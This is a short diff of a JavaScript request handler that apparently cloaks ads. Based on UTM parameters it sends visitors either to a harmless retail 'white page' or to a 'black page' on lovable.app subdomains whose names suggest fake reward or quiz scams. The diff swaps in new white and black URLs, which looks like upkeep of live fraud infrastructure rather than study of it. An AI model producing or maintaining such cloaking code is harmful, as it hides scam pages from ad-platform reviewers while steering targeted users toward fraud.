@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://zearrow.com/sterling-silver-jewelry/?_gl=1*vwnoc*_up*MQ..*_gs*MQ..&gclid=CjwKCAjwjffHBhBuEiwAKMb8pEVKoKApWXwVg6qhZongwrdZZ64lp5uD9mANS9kjRTChxcircMO4ixoChNQQAvD_BwE&gbraid=0AAAAAomeqlhMcJZOXYvP9uiCddaCpYpKI";
-    const blackPageURL = "https://apppplerewad.lovable.app/";
+    const whitePageURL = "https://www.muehldorfer.com/en/p/muehldorfer-imprima-caretta-kopfkissen/aickk/";
+    const blackPageURL = "https://instentquzzz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
